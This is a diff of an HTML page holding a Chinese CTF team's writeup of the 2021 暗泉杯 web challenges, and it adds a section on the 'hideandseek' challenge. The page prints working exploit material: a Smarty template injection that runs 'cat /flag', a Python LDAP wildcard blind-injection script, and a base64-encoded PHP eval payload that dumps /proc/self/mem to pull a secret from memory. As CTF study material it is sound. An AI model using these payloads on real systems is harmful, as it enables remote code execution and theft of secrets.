@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='* 开头题目表示赛后补题
+Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
 [萌]odd_upload 题目描述：目录结构与官方项目example相同
 所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
 
@@ -10,14 +11,14 @@ easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登
 The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
 说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
 按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&#39;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
-Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49
-有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
+Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
 import requests url = &amp;#34;http://47.'><title>2021暗泉杯 Writeup</title>
 
 <link rel='canonical' href='https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/'>
 
 <link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='2021暗泉杯 Writeup'>
-<meta property='og:description' content='Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
+<meta property='og:description' content='* 开头题目表示赛后补题
+Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
 [萌]odd_upload 题目描述：目录结构与官方项目example相同
 所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
 
@@ -26,14 +27,14 @@ easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登
 The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
 说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
 按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&#39;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
-Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49
-有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
+Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
 import requests url = &amp;#34;http://47.'>
 <meta property='og:url' content='https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/'>
 <meta property='og:site_name' content='or4nge'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='暗泉杯' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Re' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Crypto' /><meta property='article:published_time' content='2021-12-06T19:23:41&#43;08:00'/><meta property='article:modified_time' content='2021-12-06T19:23:41&#43;08:00'/><meta property='og:image' content='https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.png' />
 <meta name="twitter:title" content="2021暗泉杯 Writeup">
-<meta name="twitter:description" content="Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
+<meta name="twitter:description" content="* 开头题目表示赛后补题
+Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
 [萌]odd_upload 题目描述：目录结构与官方项目example相同
 所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
 
@@ -42,8 +43,7 @@ easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登
 The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
 说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
 按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&#39;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
-Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49
-有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
+Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
 import requests url = &amp;#34;http://47."><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.png' />
     </head>
@@ -152,7 +152,7 @@ import requests url = &amp;#34;http://47."><meta name="twitter:card" content="su
 
 
                 <time class="article-time--reading">
-                    18 minute read
+                    19 minute read
                 </time>
             </div>
         
@@ -162,7 +162,8 @@ import requests url = &amp;#34;http://47."><meta name="twitter:card" content="su
 </header>
 
     <section class="article-content">
-    <h2 id="web">Web</h2>
+    <p><code>*</code> 开头题目表示赛后补题</p>
+<h2 id="web">Web</h2>
 <h3 id="签到flag">[签到]flag</h3>
 <p>等一个一个拼出来，业余web手的笨B做题法</p>
 <h3 id="萌odd_upload">[萌]odd_upload</h3>
@@ -191,9 +192,9 @@ import requests url = &amp;#34;http://47."><meta name="twitter:card" content="su
 <p>The flag is a special email address username.It is attribute of one  account and there are multiple accounts in the directory. flag is  composed of a-z0-9_</p>
 <p>说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？</p>
 <p>按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有'(&lsquo;或者&rsquo;)&lsquo;就会报错：</p>
-<p>Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48
-Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49</p>
-<p>有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：</p>
+<pre tabindex="0"><code>Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48
+Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49
+</code></pre><p>有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://47.106.172.144:2333/&#34;</span>
 alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span>
@@ -210,7 +211,72 @@ alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a
         <span style="color:#66d9ef">else</span>:
             print(<span style="color:#e6db74">&#39;Error: [&#39;</span><span style="color:#f92672">+</span>c<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>r<span style="color:#f92672">.</span>text)
 search(<span style="color:#e6db74">&#39;&#39;</span>)
-</code></pre></div><h3 id="wschat">wschat</h3>
+</code></pre></div><h3 id="hideandseek">*hideandseek</h3>
+<p>和web没有啥关系，和二进制全是关系。</p>
+<p>先附上打本地的DockerFile:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> php:8.1.0</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> ./src /var/www/html<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> ./flag /flag<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /var/www/html/</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod -R  <span style="color:#ae81ff">0555</span>  /var/www/html/<span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;php&#34;</span>, <span style="color:#e6db74">&#34;-S&#34;</span>, <span style="color:#e6db74">&#34;0.0.0.0:8000&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;/var/www/html&#34;</span>]<span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>这题上先读flag，然后把flag给覆盖了，你只有一次执行任意代码的机会。</p>
+<p>思路上来一下子就指向了<code>/proc</code>，进程目录，我们肯定是能通过分析这个进程把flag拿到了。目前已知的<code>/proc</code>的博客有：</p>
+<blockquote>
+<p><a class="link" href="https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/"  target="_blank" rel="noopener"
+    >https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/</a></p>
+<p><a class="link" href="https://xz.aliyun.com/t/10579"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/t/10579</a></p>
+</blockquote>
+<p>第一反应是读fd，看看文件的符号链接，如果fopen了，但没fclose就有可能在fd里找到，本地一试发现没有。</p>
+<p>于是考虑利用别的，比如<code>./exe</code>，是一个ELF文件，但可惜<code>strings ./exe</code>没用，因为flag变量是在运行时读取的，生成elf是不存在这个字符串的，于是就读<code>./mem</code>，<code>/proc/{PID}/mem</code>是可用于访问进程的内存的页面。但是发现读取失败了，报错如下：</p>
+<pre tabindex="0"><code>cat mem: Input/output error
+</code></pre><p>搜到了解释原因：https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux</p>
+<p><code>/proc/$pid/mem</code>显示$pid 内存的内容与进程中的映射方式相同，即伪文件中偏移<em>x</em>处的字节与进程中地址<em>x</em>处的字节相同。如果在进程中未映射地址，则从文件中的相应偏移量读取返回<code>EIO</code>（输入/输出错误）。例如，由于进程中的第一页永远不会被映射（因此取消引用<code>NULL</code>指针会完全失败，而不是无意中访问实际内存），因此读取 的第一个字节<code>/proc/$pid/mem</code>总是会产生 I/O 错误。</p>
+<p>同时也拿到了一份用python拿内存信息的脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> re
+maps_file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)
+mem_file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/self/mem&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>, <span style="color:#ae81ff">0</span>)
+output_file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;self.dump&#34;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>)
+<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> maps_file<span style="color:#f92672">.</span>readlines():  <span style="color:#75715e"># for each mapped region</span>
+    m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])&#39;</span>, line)
+    <span style="color:#66d9ef">if</span> m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>:  <span style="color:#75715e"># if this is a readable region</span>
+        start <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">16</span>)
+        end <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">2</span>), <span style="color:#ae81ff">16</span>)
+        mem_file<span style="color:#f92672">.</span>seek(start)  <span style="color:#75715e"># seek to region start</span>
+        chunk <span style="color:#f92672">=</span> mem_file<span style="color:#f92672">.</span>read(end <span style="color:#f92672">-</span> start)  <span style="color:#75715e"># read region contents</span>
+        output_file<span style="color:#f92672">.</span>write(chunk)  <span style="color:#75715e"># dump contents to standard output</span>
+maps_file<span style="color:#f92672">.</span>close()
+mem_file<span style="color:#f92672">.</span>close()
+output_file<span style="color:#f92672">.</span>close()
+</code></pre></div><p>我盲猜flag就在内存里，但我也不是打二进制的，也不知道在哪，于是就打算把整个chunk全部正则匹配即可。</p>
+<p>把上述代码翻译成php，修改部分内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$maps_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+$mem_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/self/mem&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>);
+<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!</span> <span style="color:#a6e22e">feof</span>($maps_file)) {
+    $line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>($maps_file);<span style="color:#75715e">//fgets()函数从文件指针中读取一行
+</span><span style="color:#75715e"></span>    $m <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/&#34;</span>, $line, $match);
+    <span style="color:#66d9ef">if</span>($match[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>) {
+        $start <span style="color:#f92672">=</span> <span style="color:#a6e22e">hexdec</span>($match[<span style="color:#ae81ff">1</span>]);
+        $end <span style="color:#f92672">=</span> <span style="color:#a6e22e">hexdec</span>($match[<span style="color:#ae81ff">2</span>]);
+        <span style="color:#a6e22e">fseek</span>($mem_file, $start);
+        $chunk <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($mem_file, $end <span style="color:#f92672">-</span> $start);
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag\{.*\}/&#34;</span>, $chunk)) {
+            <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/(flag\{.*\})/&#34;</span>, $chunk, $ans);
+            <span style="color:#a6e22e">var_dump</span>($ans);
+        }
+
+    }
+}
+<span style="color:#a6e22e">fclose</span>($maps_file);
+<span style="color:#a6e22e">fclose</span>($mem_file);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>最后用base64+urlencode传参（有了安洵杯的教训，base64一定要编码），最终payload如下：</p>
+<pre tabindex="0"><code>http://5b599005-3dfe-44e4-ac13-96fc3b194f3e.nssctf.neusoft.edu.cn/?eval=eval(base64_decode(%22JG1hcHNfZmlsZSA9IGZvcGVuKCIvcHJvYy9zZWxmL21hcHMiLCAiciIpOwokbWVtX2ZpbGUgPSBmb3BlbigiL3Byb2Mvc2VsZi9tZW0iLCAicmIiKTsKd2hpbGUoISBmZW9mKCRtYXBzX2ZpbGUpKSB7CiAgICAgICAgJGxpbmUgPSBmZ2V0cygkbWFwc19maWxlKTsvL2ZnZXRzKCnlh73mlbDku47mlofku7bmjIfpkojkuK3or7vlj5bkuIDooYwKICAgICAgICAgICAgJG0gPSBwcmVnX21hdGNoKCIvKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pLyIsICRsaW5lLCAkbWF0Y2gpOwogICAgICAgICAgICBpZigkbWF0Y2hbM10gPT0gJ3InKSB7CiAgICAgICAgICAgICAgICAgICAgJHN0YXJ0ID0gaGV4ZGVjKCRtYXRjaFsxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRlbmQgPSBoZXhkZWMoJG1hdGNoWzJdKTsKICAgICAgICAgICAgICAgICAgICAgICAgZnNlZWsoJG1lbV9maWxlLCAkc3RhcnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNodW5rID0gZnJlYWQoJG1lbV9maWxlLCAkZW5kIC0gJHN0YXJ0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi9mbGFnXHsuKlx9LyIsICRjaHVuaykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goIi8oZmxhZ1x7LipcfSkvIiwgJGNodW5rLCAkYW5zKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyX2R1bXAoJGFucyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KfQpmY2xvc2UoJG1hcHNfZmlsZSk7CmZjbG9zZSgkbWVtX2ZpbGUpOw%3D%3D%22));
+</code></pre><h3 id="wschat">*wschat</h3>
 <p>前后端交互用的是socket io，参数格式用的是protobuf，前端的js加了很多混淆和反调试。可以在这个网站https://lelinhtinh.github.io/de4js/做个简单的恢复后再看。</p>
 <p>贴一下我恢复后的还算是能看的关键代码：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
@@ -1606,7 +1672,8 @@ cap<span style="color:#f92672">.</span>close()
         <li><a href="#签到flag">[签到]flag</a></li>
         <li><a href="#萌odd_upload">[萌]odd_upload</a></li>
         <li><a href="#easyinject">easyinject</a></li>
-        <li><a href="#wschat">wschat</a></li>
+        <li><a href="#hideandseek">*hideandseek</a></li>
+        <li><a href="#wschat">*wschat</a></li>
       </ul>
     </li>
     <li><a href="#pwn">Pwn</a>
